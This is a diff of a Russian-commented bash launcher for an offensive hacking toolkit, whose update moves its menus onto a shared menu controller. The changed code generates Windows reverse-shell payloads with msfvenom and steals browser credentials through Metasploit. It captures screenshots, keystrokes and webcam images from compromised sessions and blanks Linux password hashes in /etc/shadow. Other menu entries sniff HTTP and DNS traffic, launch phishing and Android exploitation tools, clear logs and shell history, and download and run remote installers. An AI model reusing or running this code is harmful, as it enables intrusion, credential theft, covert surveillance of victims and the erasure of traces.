@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="30.7"
+CURRENT_VERSION="30.8"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -804,18 +804,80 @@ update_prime() {
 }
 
 
-run_servers() {
-    clear
-    echo -e "${B}>>> [ SECURITY & DATA HUB ] <<<${NC}"
-    echo -e "V) AV-Scanner  S) Share-File  U) Upload-Inbound  B) Back"
-    read -p ">> " srv_opt
-    case $srv_opt in
-        v|V) python3 /root/av_server.py ;;
-        s|S) python3 /root/share_server.py ;;
-        u|U) python3 /root/upload_server.py ;;
-        *) return ;;
-    esac
+
+# Универсальный динамический контроллер
+# $1 - Заголовок (Title)
+# $2 - Массив названий пунктов
+# $3 - Массив соответствующих функций
+prime_dynamic_controller() {
+    # Превращаем строки обратно в локальные массивы
+    local title=$1
+    local -a labels=($2)
+    local -a actions=($3)
+    
+    while true; do
+        clear
+        echo -e "${R}========== [ $title ] ==========${NC}"
+        get_stats # Твоя функция статистики (CPU/RAM/DISK)
+        echo -e "---------------------------------------"
+        
+        # Динамическая отрисовка в две колонки для экономии места на экране
+        for ((i=0; i<${#labels[@]}; i++)); do
+            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
+            # Перенос строки каждую вторую итерацию
+            if (( (i+1) % 2 == 0 )); then echo ""; fi
+        done
+        echo -e "\n${Y} B) BACK / EXIT${NC}"
+        echo -e "---------------------------------------"
+        
+        read -p ">> " choice
+        
+        # Выход
+        if [[ "$choice" =~ ^[Bb]$ ]]; then return; fi
+        
+        # Проверка: является ли ввод числом и попадает ли в диапазон
+        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
+            local idx=$((choice-1))
+            echo -e "${B}[*] Запуск: ${labels[$idx]}...${NC}"
+            ${actions[$idx]} # Вызов функции
+        else
+            echo -e "${R}[!] Ошибка: выберите пункт от 1 до ${#labels[@]}${NC}"
+            sleep 1
+        fi
+    done
 }
+
+
+# Вспомогательные функции-обертки для корректного запуска Python-скриптов
+run_av_srv() { 
+    echo -e "${B}[*] Инициализация AV-Scanner...${NC}"
+    python3 /root/av_server.py 
+}
+
+run_share_srv() { 
+    echo -e "${B}[*] Запуск Share-File Server...${NC}"
+    python3 /root/share_server.py 
+}
+
+run_upload_srv() { 
+    echo -e "${B}[*] Ожидание входящих данных (Upload)...${NC}"
+    python3 /root/upload_server.py 
+}
+
+# Обновленный SECURITY & DATA HUB
+run_servers() {
+    # 1. Список названий (отображение)
+    local srv_names="AV-Scanner Share-File Upload-Inbound"
+    
+    # 2. Список функций/команд (исполнение)
+    local srv_funcs="run_av_srv run_share_srv run_upload_srv"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "SECURITY & DATA HUB" "$srv_names" "$srv_funcs"
+}
+
+
+
 
 # --- Глобальные параметры Ghost ---
 GHOST_PATH="/root/Ghost"
@@ -907,30 +969,31 @@ extract_all_passwords() {
     echo -e "\033[1;32m[+] Сбор завершен. Отчет: /root/reports/universal_passwords.txt\033[0m"
 }
 
-reset_any_os_password() {
-    echo -e "\n[1] Windows (SAM)"
-    echo -e "[2] Linux (Shadow Edit)"
-    echo -e "[3] macOS (Instructions)"
-    read -p "Выберите ОС цели: " os_type
 
-    case $os_type in
-        1)
-            # Тот самый умный поиск SAM, который мы делали
-            reset_windows_password 
-            ;;
-        2)
-            echo -e "\033[1;33m[*] Сброс пароля Linux...\033[0m"
-            read -p "Введите имя пользователя: " username
-            # Метод: удаление хэша пароля в /etc/shadow (делает пароль пустым)
-            sed -i "s/^$username:[^:]*:/$username::/" /etc/shadow
-            echo -e "\033[1;32m[+] Пароль для $username удален. Теперь можно войти без него.\033[0m"
-            ;;
-        3)
-            echo -e "\033[1;34m[*] Для macOS используйте 'resetpassword' в Recovery Mode или терминал:\033[0m"
-            echo "Команда: dscl . -passwd /Users/username newpassword"
-            ;;
-    esac
+# Обновленный сброс паролей ОС
+reset_any_os_password() {
+    # Список названий ОС
+    local os_names="Windows_(SAM) Linux_(Shadow_Edit) macOS_(Instructions)"
+    
+    # Существующие функции и команды
+    local os_funcs="reset_windows_password reset_linux_pass reset_macos_info"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "OS PASSWORD RESET" "$os_names" "$os_funcs"
 }
+
+# Короткие вызовы для интеграции в движок
+reset_linux_pass() {
+    read -p "Введите имя пользователя: " username
+    sed -i "s/^$username:[^:]*:/$username::/" /etc/shadow
+    echo -e "${G}[+] Пароль для $username удален.${NC}"
+}
+
+reset_macos_info() {
+    echo -e "${B}[*] Команда: dscl . -passwd /Users/username newpassword${NC}"
+    read -p "Нажмите Enter..."
+}
+
 
 
 # Функция: Сброс пароля Windows через поиск SAM
@@ -979,59 +1042,48 @@ smart_threat_scan() {
 
 
 
-# Функция: PC Recovery & Password Extraction
-# Описание: Извлечение паролей из системы, браузеров и сброс пароля ОС
+# Обновленный PC Recovery & Password Extraction
 pc_password_recovery() {
-    while true; do
-        clear
-        echo -e "\033[1;33m--- MULTI-OS RECOVERY & FORENSIC (Win/Lin/Mac) ---\033[0m"
-        echo -e "1) Extract Passwords (All Platforms)"
-        echo -e "2) Reset OS Password (Win/Lin/Mac)"
-        echo -e "3) Heuristic Malware Scan (Cross-Platform)"
-        echo -e "B) Back"
-        read -p ">> " recovery_choice
-
-        case $recovery_choice in
-            1) extract_all_passwords ;;
-            2) reset_any_os_password ;;
-            3) smart_threat_scan ;;
-            [Bb]) return ;;
-        esac
-        echo -e "\nНажмите Enter..."
-        read
-    done
+    # 1. Список названий для отображения (подчеркивания заменятся на пробелы)
+    local pc_names="Extract_Passwords Reset_OS_Password Heuristic_Scan"
+    
+    # 2. Существующие функции
+    local pc_funcs="extract_all_passwords reset_any_os_password smart_threat_scan"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$pc_names" "$pc_funcs"
 }
 
 
 
-# Функция: Глубокий анализ сети через TShark
-# Описание: Использует уже установленный /usr/bin/tshark
+
+# Обновленный ТЕРМИНАЛЬНЫЙ АНАЛИЗАТОР (TSHARK)
 analyze_network_traffic() {
-    clear
-    echo -e "\033[1;33m--- ТЕРМИНАЛЬНЫЙ АНАЛИЗАТОР (TSHARK) ---\033[0m"
-    echo -e "1) Мониторинг всех хостов (Кто в сети?)"
-    echo -e "2) Перехват HTTP/DNS (Поиск данных)"
-    echo -e "3) Запись трафика в файл (.pcap для ПК)"
-    echo -e "B) Назад"
-    read -p ">> " net_choice
-
-    case $net_choice in
-        1) 
-            # Показывает время, IP источника, IP цели и протокол
-            tshark -i wlan0 -T fields -e frame.time_relative -e ip.src -e ip.dst -e _ws.col.Protocol 
-            ;;
-        2) 
-            # Вытягивает посещенные сайты и поисковые запросы
-            tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name 
-            ;;
-        3) 
-            # Сохраняет трафик в папку /root/reports для анализа на компе
-            echo -e "[*] Запись... Нажми CTRL+C для остановки."
-            tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap
-            ;;
-        *) return ;;
-    esac
+    # 1. Список названий (для корректного отображения пробелов используй _)
+    local net_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record_(.pcap)"
+    
+    # 2. Существующие функции/команды
+    local net_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "TSHARK ANALYZER" "$net_names" "$net_funcs"
 }
+
+# Вспомогательные функции для корректной работы TShark в движке
+run_host_monitor() {
+    tshark -i wlan0 -T fields -e frame.time_relative -e ip.src -e ip.dst -e _ws.col.Protocol
+}
+
+run_http_dns_sniffer() {
+    tshark -i wlan0 -Y "http.request || dns" -T fields -e http.host -e dns.qry.name
+}
+
+run_traffic_record() {
+    mkdir -p /root/reports
+    echo -e "${B}[*] Запись... Нажми CTRL+C для остановки.${NC}"
+    tshark -i wlan0 -w /root/reports/capture_$(date +%H%M).pcap
+}
+
 
 # Функция: Глубокий аудит устройства
 # Параметры: target_ip
@@ -1057,37 +1109,18 @@ run_deep_audit() {
     read -n 1 -s -r -p "Нажмите любую клавишу..."
 }
 
-# Основная функция управления
+# Обновленное УПРАВЛЕНИЕ УСТРОЙСТВАМИ И СЕТЬЮ
 run_device_hack() {
-    while true; do
-        clear
-        echo -e "\033[1;36m--- УПРАВЛЕНИЕ УСТРОЙСТВАМИ И СЕТЬЮ ---\033[0m"
-        echo -e "1) Ghost Framework (Manual)      - Интерактивный контроль Android"
-        echo -e "2) TShark Network Sniffer        - Умный перехват трафика"
-        echo -e "3) Ghost Auto-Pwn (Connect)      - Мгновенное подключение по IP"
-        echo -e "4) Search ExploitDB              - Поиск уязвимостей в базе"
-        echo -e "5) Smart System Audit            - Эвристика, пароли и вирусы"
-        echo -e "6) Multi-OS Recovery (USB)       - Сброс паролей Win/Lin/Mac"
-        echo -e "7) Bluetooth Scan                - Поиск устройств рядом"
-        echo -e "8) Anti-Forensic (Clear)         - Очистка логов и следов"
-        echo -e "B) Back"
-        echo -e "--------------------------------------------------------"
-        read -p ">> " dh
-
-        case $dh in
-            1) launch_ghost_manual ;;
-            2) analyze_network_traffic ;; # Использует найденный /usr/bin/tshark
-            3) launch_ghost_autopwn ;;
-            4) search_exploit_db ;;
-            5) run_deep_audit ;;         # Пароли, скан памяти и портов
-            6) pc_password_recovery ;;   # Универсальный сброс (SAM/Shadow)
-            7) scan_bluetooth_devices ;;
-            8) clear_logs_and_traces ;;   # Защита твоего "Гамбита"
-            [Bb]) return ;;
-            *) echo -e "\033[1;31mНеверный выбор\033[0m"; sleep 1 ;;
-        esac
-    done
+    # 1. Список названий для отображения
+    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Multi-OS_Recovery Bluetooth_Scan Anti-Forensic"
+    
+    # 2. Существующие функции
+    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit pc_password_recovery scan_bluetooth_devices clear_logs_and_traces"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
 }
+
 
 run_phishing() {
     [ -d "/root/zphisher" ] && cd /root/zphisher && ./zphisher.sh
@@ -1099,95 +1132,115 @@ run_ghost_scan() {
 }
 
 # Дополнение к run_exploit_hub для управления и аудита ПК
+# Обновленный PC REMOTE CONTROL & AUDIT
 run_pc_control() {
-    echo -e "${B}>>> [ PC REMOTE CONTROL & AUDIT ] <<<${NC}"
-    echo -e "1) Payload Generator (Create EXE/LNK)"
-    echo -e "2) Password Stealer (Browser/System/Wifi)"
-    echo -e "3) Remote AV-Scanner (Check PC for threats)"
-    echo -e "4) Post-Exploit Menu (Screenshots/Keylogger)"
-    read -p ">> " pc_cmd
+    # 1. Список названий для отображения
+    local pc_ctrl_names="Payload_Generator Password_Stealer Remote_AV-Scanner Post-Exploit_Menu"
+    
+    # 2. Список функций/команд
+    local pc_ctrl_funcs="pc_gen_payload pc_steal_creds pc_remote_scan pc_post_exploit"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "PC CONTROL & AUDIT" "$pc_ctrl_names" "$pc_ctrl_funcs"
+}
 
-    case $pc_cmd in
-        1)
-            read -p "LHOST (Your IP): " lh
-            msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe
-            echo -e "${G}[+] Payload saved to /root/payload.exe${NC}"
-            ;;
-        2)
-            echo -e "${Y}[*] Extracting credentials...${NC}"
-            # Автоматический запуск модулей Mimikatz и Creds через Metasploit
-            msfconsole -q -x "use post/windows/gather/credentials/browser_helper; set SESSION $SESS_ID; run; exit"
-            ;;
-        3)
-            echo -e "${Y}[*] Remote System Scan...${NC}"
-            # Проверка установленного ПО и поиск уязвимостей (CVE)
-            nmap --script smb-vuln* -p 445 $target
-            ;;
-        4)
-            echo -e "${B}Active Control: 1-Screenshot  2-Keylog  3-Webcam${NC}"
-            read -p "> " act
-            [[ $act == 1 ]] && msfconsole -q -x "sessions -i $SESS_ID -c screenshot"
-            ;;
+# Вспомогательные функции для интеграции существующих команд в движок
+pc_gen_payload() {
+    read -p "LHOST (Your IP): " lh
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=4444 -f exe -o /root/payload.exe
+    echo -e "${G}[+] Payload saved to /root/payload.exe${NC}"
+    read -p "Press Enter..."
+}
+
+pc_steal_creds() {
+    echo -e "${Y}[*] Extracting credentials...${NC}"
+    msfconsole -q -x "use post/windows/gather/credentials/browser_helper; set SESSION $SESS_ID; run; exit"
+}
+
+pc_remote_scan() {
+    echo -e "${Y}[*] Remote System Scan...${NC}"
+    nmap --script smb-vuln* -p 445 $target
+    read -p "Press Enter..."
+}
+
+pc_post_exploit() {
+    echo -e "${B}Active Control: 1-Screenshot  2-Keylog  3-Webcam${NC}"
+    read -p "> " act
+    case $act in
+        1) msfconsole -q -x "sessions -i $SESS_ID -c screenshot" ;;
+        2) msfconsole -q -x "sessions -i $SESS_ID -c keylog_recorder" ;;
+        3) msfconsole -q -x "sessions -i $SESS_ID -c webcam_snap" ;;
     esac
 }
 
+
+# Обновленный MANUAL INSTALLATION HUB
 install_manual_tools() {
-    clear
-    echo -e "${Y}>>> [ MANUAL INSTALLATION HUB ] <<<${NC}"
-    echo -e "1) Metasploit (Heavy)  2) Searchsploit (DB)  3) Sliver C2  4) LaZagne"
-    read -p "Выберите инструмент: " m_opt
-
-    case $m_opt in
-        1)
-            echo -e "${G}[*] Installing Metasploit...${NC}"
-            # Используем самый стабильный скрипт для Termux/Linux на Android
-            pkg install wget -y && wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
-            chmod +x metasploit.sh && ./metasploit.sh
-            ;;
-        2)
-            echo -e "${G}[*] Installing ExploitDB...${NC}"
-            git clone --depth 1 https://github.com/offensive-security/exploitdb.git /root/exploitdb
-            ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit
-            ;;
-        3)
-            echo -e "${G}[*] Downloading Sliver Server...${NC}"
-            curl -Ls https://api.github.com/repos/BishopFox/sliver/releases/latest | grep "browser_download_url.*sliver-server_linux" | cut -d : -f 2,3 | tr -d \" | wget -qi - -O /root/sliver-server
-            chmod +x /root/sliver-server
-            ;;
-        4)
-            echo -e "${G}[*] Installing LaZagne...${NC}"
-            git clone https://github.com/AlessandroZ/LaZagne.git /root/lazagne
-            cd /root/lazagne && python3 -m pip install -r requirements.txt --break-system-packages
-            ;;
-    esac
-    read -p "Установка завершена. Нажмите Enter..."
+    # 1. Список названий для отображения
+    local install_names="Metasploit_(Heavy) Searchsploit_(DB) Sliver_C2 LaZagne"
+    
+    # 2. Существующие функции/команды
+    local install_funcs="inst_metasploit inst_searchsploit inst_sliver inst_lazagne"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "MANUAL INSTALLATION HUB" "$install_names" "$install_funcs"
 }
+
+# Вспомогательные функции для корректной установки через движок
+inst_metasploit() {
+    echo -e "${G}[*] Installing Metasploit...${NC}"
+    pkg install wget -y && wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
+    chmod +x metasploit.sh && ./metasploit.sh
+    read -p "Нажмите Enter..."
+}
+
+inst_searchsploit() {
+    echo -e "${G}[*] Installing ExploitDB...${NC}"
+    git clone --depth 1 https://github.com/offensive-security/exploitdb.git /root/exploitdb
+    ln -sf /root/exploitdb/searchsploit /usr/local/bin/searchsploit
+    read -p "Нажмите Enter..."
+}
+
+inst_sliver() {
+    echo -e "${G}[*] Downloading Sliver Server...${NC}"
+    curl -Ls https://api.github.com/repos/BishopFox/sliver/releases/latest | grep "browser_download_url.*sliver-server_linux" | cut -d : -f 2,3 | tr -d \" | wget -qi - -O /root/sliver-server
+    chmod +x /root/sliver-server
+    read -p "Нажмите Enter..."
+}
+
+inst_lazagne() {
+    echo -e "${G}[*] Installing LaZagne...${NC}"
+    git clone https://github.com/AlessandroZ/LaZagne.git /root/lazagne
+    cd /root/lazagne && python3 -m pip install -r requirements.txt --break-system-packages
+    read -p "Нажмите Enter..."
+}
+
 
 
 run_exploit_hub() {
-    clear; zero_clear
-    echo -e "${Y}>>> [ EXPLOIT HUB: TOTAL CONTROL ] <<<${NC}"
-    echo -e "1) PhoneSploit Pro (Android)  2) SQLmap/Web  3) PC/Network 4) PC Control"
-    read -p ">> " ex_opt
-
-    case $ex_opt in
-        1)
-            # Переходим в директорию, которую ты склонировал на скриншоте
-            cd /root/PhoneSploit-Pro
-            python3 phonesploitpro.py
-            ;;
-        2)
-            run_sqlmap_smart # Вызов эвристики для веба
-            ;;
-        3)
-            # Тот самый поиск эксплойтов для ПК через nmap
-            read -p "Target IP: " t
-            nmap -sV --script vuln "$t"
-            ;;
-4)run_pc_control ;;
-    esac
-    zero_clear; history -c
+ # Обновленный EXPLOIT HUB: TOTAL CONTROL
+run_exploit_hub() {
+    # 1. Список названий для отображения (подчеркивания заменятся на пробелы)
+    local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
+    
+    # 2. Существующие функции и прямые команды
+    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
 }
+
+# Вспомогательные функции для интеграции команд в движок
+ex_phonesploit_pro() {
+    cd /root/PhoneSploit-Pro && python3 phonesploitpro.py
+}
+
+ex_pc_network_scan() {
+    read -p "Target IP: " t
+    nmap -sV --script vuln "$t"
+    read -p "Нажмите Enter..."
+}
+
 
 
 run_sqlmap() {
@@ -1219,22 +1272,26 @@ run_iban_scan() {
     python3 /root/iban_check.py "$(echo $v_iban | tr -d ' ')"
 }
 
-while true; do
-    repair; 
-    echo -e "${R}========== [ PRIME MASTER v$CURRENT_VERSION ] ==========${NC}"
-    get_stats
-    echo -e "${G}G) GHOST SCAN   1) SOCIAL ENG   2) SQLMAP"
-    echo -e "3) SMART OSINT  4) DEVICE HACK   E) EXPLOIT HUB"
-    echo -e "6) AIO OSINT AUTO    7) IBAN/RIB SCAN"
-    echo -e "M) MANUAL INSTALL  U) UPDATE CORE  I) SERVICE HUB  0) EXIT${NC}"
-    read -p ">> " opt
-    case $opt in
-        g|G) run_ghost_scan ;; 1) run_phishing ;; 2) run_sqlmap ;; 
-        3) run_osint ;; 4) run_device_hack ;; 5|i|I) run_servers ;; 
-       m|M) install_manual_tools ;;   6) run_osint2 ;; 7) run_iban_scan ;; u|U) update_prime ;; 
-        0) exit 0 ;; e) run_exploit_hub ;;
-    esac
-done
+# Обновленное ГЛАВНОЕ МЕНЮ (PRIME MASTER)
+run_main_menu() {
+    # 1. Список имен (названия пунктов в меню)
+    local main_names="GHOST_SCAN SOCIAL_ENG SQLMAP SMART_OSINT DEVICE_HACK EXPLOIT_HUB AIO_OSINT_AUTO IBAN/RIB_SCAN MANUAL_INSTALL UPDATE_CORE SERVICE_HUB EXIT"
+    
+    # 2. Список соответствующих функций
+    local main_funcs="run_ghost_scan run_phishing run_sqlmap run_osint run_device_hack run_exploit_hub run_osint2 run_iban_scan install_manual_tools update_prime run_servers exit_script"
+    
+    # Запуск через динамический контроллер
+    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
+}
+
+# Вспомогательная функция для чистого выхода (БЕЗ блокировки Wi-Fi)
+exit_script() {
+    echo -e "${Y}[*] Очистка истории сессии...${NC}"
+    history -c
+    exit 0
+}
+
+
 EOF
 )
     # Применяем версию и записываем через нашу надежную функцию
@@ -1248,7 +1305,7 @@ update_module "/root/share_server.py" "1.0" generate_share_server_code "File-Sha
 update_module "/root/upload_server.py"  "1.0.4" generate_upload_server_code  "Inbound-Drop-Box"
 
 # --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
-update_module "/root/launcher.sh" "30.7" generate_launcher_code "Prime-Launcher"
+update_module "/root/launcher.sh" "30.8" generate_launcher_code "Prime-Launcher"
 chmod +x /root/launcher.sh
 ln -sf /root/launcher.sh /usr/local/bin/launcher
 repair_and_clean
